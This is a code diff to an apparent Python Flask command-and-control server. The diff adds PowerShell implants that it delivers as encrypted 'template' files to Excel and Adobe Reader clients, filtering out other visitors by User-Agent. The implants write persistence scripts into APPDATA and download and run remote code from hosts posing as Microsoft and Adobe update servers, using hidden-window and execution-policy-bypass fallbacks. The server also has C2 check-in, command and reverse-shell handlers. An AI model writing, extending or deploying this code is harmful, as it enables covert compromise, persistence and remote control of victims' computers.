@@ -15,6 +15,8 @@ import sqlite3
 import random
 import time
 import threading
+import re
+import tempfile
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import base64
@@ -65,7 +67,7 @@ def init_database():
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS requests
                  (id INTEGER PRIMARY KEY, timestamp TEXT, ip TEXT, 
-                  user_agent TEXT, endpoint TEXT, status TEXT)''')
+                  user_agent TEXT, endpoint TEXT, status TEXT, request_type TEXT)''')
     c.execute('''CREATE TABLE IF NOT EXISTS sessions
                  (id INTEGER PRIMARY KEY, session_id TEXT, ip TEXT, 
                   first_seen TEXT, last_seen TEXT, status TEXT)''')
@@ -75,13 +77,13 @@ def init_database():
     conn.commit()
     conn.close()
 
-def log_request(ip, user_agent, endpoint, status="DELIVERED"):
+def log_request(ip, user_agent, endpoint, status="DELIVERED", request_type="UNKNOWN"):
     """Log requests to database"""
     conn = sqlite3.connect(config.DATABASE)
     c = conn.cursor()
     timestamp = datetime.datetime.now().isoformat()
-    c.execute("INSERT INTO requests (timestamp, ip, user_agent, endpoint, status) VALUES (?, ?, ?, ?, ?)",
-              (timestamp, ip, user_agent, endpoint, status))
+    c.execute("INSERT INTO requests (timestamp, ip, user_agent, endpoint, status, request_type) VALUES (?, ?, ?, ?, ?, ?)",
+              (timestamp, ip, user_agent, endpoint, status, request_type))
     conn.commit()
     conn.close()
 
@@ -114,15 +116,21 @@ def log_command(session_id, command, result):
     conn.commit()
     conn.close()
 
-def is_excel_request(user_agent):
-    """Check if request comes from genuine Excel"""
+def is_legitimate_request(user_agent):
+    """Check if request comes from genuine Office application or PDF reader"""
     if not user_agent:
         return False
     
     user_agent = user_agent.lower()
-    excel_indicators = ['excel', 'microsoft', 'office']
     
-    return any(indicator in user_agent for indicator in excel_indicators)
+    # Excel/Office indicators
+    office_indicators = ['excel', 'microsoft', 'office', 'msoffice']
+    
+    # PDF reader indicators
+    pdf_indicators = ['adobe', 'acrobat', 'pdf', 'reader', 'adobe reader']
+    
+    return (any(indicator in user_agent for indicator in office_indicators) or
+            any(indicator in user_agent for indicator in pdf_indicators))
 
 def encrypt_data(data, key):
     """Encrypt data with AES"""
@@ -193,24 +201,145 @@ def reverse_shell_handler():
     except Exception as e:
         print(f"[-] Reverse shell handler error: {e}")
 
+def create_excel_payload():
+    """Create Excel-specific payload"""
+    return '''# Excel-specific payload
+function Invoke-ExcelImplant {
+    # Excel-specific persistence and execution
+    $persistencePath = "$env:APPDATA\\Microsoft\\Excel\\startup.ps1"
+    if (-not (Test-Path (Split-Path $persistencePath))) {
+        New-Item -ItemType Directory -Path (Split-Path $persistencePath) -Force
+    }
+    
+    # Download and execute main payload
+    $payloadUrl = "https://cdn.microsoft-update.com/office/security_update.ps1"
+    try {
+        $payload = Invoke-WebRequest -Uri $payloadUrl -UseBasicParsing
+        Set-Content -Path $persistencePath -Value $payload.Content
+        & $persistencePath
+    } catch {
+        # Fallback to direct execution
+        Invoke-Expression $payload.Content
+    }
+    
+    "Excel payload executed successfully"
+}
+
+Invoke-ExcelImplant
+'''
+
+def create_pdf_exploit_payload():
+    """Create PDF-specific payload"""
+    return '''# PDF-specific payload
+function Invoke-PDFImplant {
+    # PDF-specific techniques with different persistence
+    $persistencePath = "$env:APPDATA\\Adobe\\Reader\\update_check.ps1"
+    if (-not (Test-Path (Split-Path $persistencePath))) {
+        New-Item -ItemType Directory -Path (Split-Path $persistencePath) -Force
+    }
+    
+    # Use different download technique for PDF
+    $payloadUrl = "https://assets.adobe.com/reader/security_patch.ps1"
+    try {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($payloadUrl, $persistencePath)
+        & $persistencePath
+    } catch {
+        # Alternative technique
+        try {
+            Start-Process -FilePath "powershell" -ArgumentList "-ExecutionPolicy Bypass -File `"$persistencePath`"" -WindowStyle Hidden
+        } catch {
+            # Final fallback
+            Invoke-Expression (New-Object Net.WebClient).DownloadString($payloadUrl)
+        }
+    }
+    
+    "PDF payload executed successfully"
+}
+
+Invoke-PDFImplant
+'''
+
 @app.route('/template.ole')
 def serve_template():
-    """Serve the malicious template"""
+    """Serve the malicious template with appropriate payload"""
     client_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent', '')
     
-    if not is_excel_request(user_agent):
-        log_request(client_ip, user_agent, '/template.ole', 'BLOCKED')
+    if not is_legitimate_request(user_agent):
+        log_request(client_ip, user_agent, '/template.ole', 'BLOCKED', 'UNKNOWN')
         abort(404)
-    
-    log_request(client_ip, user_agent, '/template.ole')
     
     try:
-        return send_file(config.TEMPLATE_FILE, 
-                        as_attachment=True,
-                        download_name='financial_template.ole')
-    except FileNotFoundError:
-        abort(404)
+        # Determine if this is an Excel or PDF request
+        user_agent_lower = user_agent.lower()
+        is_pdf_request = any(indicator in user_agent_lower 
+                           for indicator in ['adobe', 'acrobat', 'pdf', 'reader'])
+        
+        if is_pdf_request:
+            # PDF-specific payload
+            pdf_payload = create_pdf_exploit_payload()
+            encrypted_payload = encrypt_data(pdf_payload, config.ENCRYPTION_KEY)
+            
+            # Create PDF-specific template
+            template_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+    <Object ProgID="PDF.Exploit.1" Version="1.0">
+        <Payload>{encrypted_payload}</Payload>
+        <ActivationCondition>TRUE</ActivationCondition>
+        <TargetApplication>Adobe Reader</TargetApplication>
+    </Object>
+</Objects>'''
+            
+            filename = 'document_template.ole'
+            request_type = 'PDF'
+        else:
+            # Excel payload
+            excel_payload = create_excel_payload()
+            encrypted_payload = encrypt_data(excel_payload, config.ENCRYPTION_KEY)
+            
+            # Create Excel-specific template
+            template_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+    <Object ProgID="Excel.Macro.1" Version="1.0">
+        <Payload>{encrypted_payload}</Payload>
+        <ActivationCondition>TRUE</ActivationCondition>
+        <TargetApplication>Microsoft Office Excel</TargetApplication>
+    </Object>
+</Objects>'''
+            
+            filename = 'financial_template.ole'
+            request_type = 'Excel'
+        
+        # Log the specific request type
+        log_request(client_ip, user_agent, '/template.ole', 'DELIVERED', request_type)
+        
+        # Create temporary file with customized content
+        temp_template = tempfile.NamedTemporaryFile(delete=False, suffix='.ole')
+        with open(temp_template.name, 'w') as f:
+            f.write(template_content)
+        
+        response = send_file(
+            temp_template.name, 
+            as_attachment=True,
+            download_name=filename,
+            attachment_filename=filename
+        )
+        
+        # Clean up the temporary file after sending
+        @response.call_on_close
+        def cleanup_temp_file():
+            try:
+                os.unlink(temp_template.name)
+            except:
+                pass
+                
+        return response
+        
+    except Exception as e:
+        print(f"[-] Template serving error: {e}")
+        log_request(client_ip, user_agent, '/template.ole', 'ERROR', 'UNKNOWN')
+        abort(500)
 
 @app.route('/c2/checkin', methods=['POST'])
 def c2_checkin():
@@ -296,22 +425,33 @@ def admin_stats():
     c.execute("SELECT COUNT(*) FROM commands")
     total_commands = c.fetchone()[0]
     
+    # Get request type breakdown
+    c.execute("SELECT request_type, COUNT(*) FROM requests GROUP BY request_type")
+    request_types = c.fetchall()
+    
     conn.close()
     
     return jsonify({
         'total_requests': total_requests,
         'total_sessions': total_sessions,
         'total_commands': total_commands,
-        'active_sessions': len(command_queue)
+        'active_sessions': len(command_queue),
+        'request_types': dict(request_types)
     })
 
 def generate_malicious_template():
-    """Generate the malicious template file"""
+    """Generate the base malicious template file"""
     template_content = '''<?xml version="1.0" encoding="UTF-8"?>
 <Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
     <Object ProgID="Excel.Macro.1" Version="1.0">
-        <Payload>EMBEDDED_PAYLOAD</Payload>
+        <Payload>EMBEDDED_PAYLOAD_PLACEHOLDER</Payload>
         <ActivationCondition>TRUE</ActivationCondition>
+        <TargetApplication>Microsoft Office Excel</TargetApplication>
+    </Object>
+    <Object ProgID="PDF.Exploit.1" Version="1.0">
+        <Payload>PDF_EXPLOIT_PAYLOAD_PLACEHOLDER</Payload>
+        <ActivationCondition>TRUE</ActivationCondition>
+        <TargetApplication>Adobe Reader</TargetApplication>
     </Object>
 </Objects>'''
     
@@ -343,5 +483,8 @@ if __name__ == '__main__':
     print("    - POST /c2/result       (Command results)")
     print("    - POST /c2/command      (Submit commands)")
     print("    - GET  /c2/sessions     (List active sessions)")
+    print("    - GET  /admin/stats     (Server statistics)")
+    print("[+] Detection: Now supports both Excel and PDF User-Agents")
+    print("[+] OPSEC: Dynamic payload generation based on client type")
     
     app.run(host=config.HOST, port=config.PORT, debug=False, use_reloader=False)
